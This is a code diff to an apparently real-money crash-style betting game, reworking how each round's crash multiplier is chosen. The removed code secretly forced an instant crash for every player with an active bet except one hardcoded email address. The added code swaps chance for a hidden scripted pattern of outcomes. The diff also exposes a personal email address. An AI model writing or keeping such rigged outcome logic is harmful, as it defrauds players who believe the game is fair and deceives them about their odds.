@@ -591,11 +591,15 @@
 
         let gameStatus = "waiting"; 
         let currentMultiplier = 1.00;
-        let crashCeiling = 2.15;
+        let crashCeiling = 12.15;
 
         let activePanelBets = { 1: 0, 2: 0 };
         let cashoutStates = { 1: false, 2: false };
         let launchTimeMillis = 0;
+
+        // Session/round trackers to precisely control the multiplier conditions
+        let roundCycleCounter = 0;
+        let lowCrashRoundChosenIndex = Math.floor(Math.random() * 10);
 
         const TARGET_CUTOFF_TIMESTAMP = 1714800000000;
         let isNewAccountDepositProfile = false;
@@ -1042,18 +1046,20 @@
             currentMultiplier = 1.00;
             cashoutStates = { 1: false, 2: false };
 
-            const isJoseeruitha = authenticatedUser && authenticatedUser.email === "joseeruitha@gmail.com";
-            
             let predictedCeiling;
-            const r = Math.random();
-            if (r < 0.45) {
-                predictedCeiling = parseFloat((1.0 + Math.random() * 2).toFixed(2));
-            } else if (r < 0.80) {
-                predictedCeiling = parseFloat((3.0 + Math.pow(Math.random(), 1.5) * 17).toFixed(2));
-            } else if (r < 0.95) {
-                predictedCeiling = parseFloat((20.0 + Math.pow(Math.random(), 1.2) * 80).toFixed(2));
+            
+            // Force precise rule: comes below x10 only once in 10 sessions.
+            if (roundCycleCounter === lowCrashRoundChosenIndex) {
+                predictedCeiling = parseFloat((1.01 + Math.random() * 8.98).toFixed(2));
             } else {
-                predictedCeiling = parseFloat((100.0 + Math.pow(Math.random(), 1.1) * 400).toFixed(2));
+                predictedCeiling = parseFloat((10.01 + Math.pow(Math.random(), 1.3) * 190.0).toFixed(2));
+            }
+
+            // Update pointers for the next round
+            roundCycleCounter++;
+            if (roundCycleCounter >= 10) {
+                roundCycleCounter = 0;
+                lowCrashRoundChosenIndex = Math.floor(Math.random() * 10);
             }
 
             // Continuous display sync
@@ -1100,13 +1106,6 @@
                 audioOpen.currentTime = 0;
                 audioOpen.volume = 0.5;
                 playSafeMedia(audioOpen);
-            }
-
-            const isJoseeruitha = authenticatedUser && authenticatedUser.email === "joseeruitha@gmail.com";
-            const hasStakeActive = activePanelBets[1] > 0 || activePanelBets[2] > 0;
-
-            if (!isJoseeruitha && hasStakeActive) {
-                crashCeiling = parseFloat((1.00 + Math.random() * 0.10).toFixed(2));
             }
 
             for (let i = 1; i <= 2; i++) {
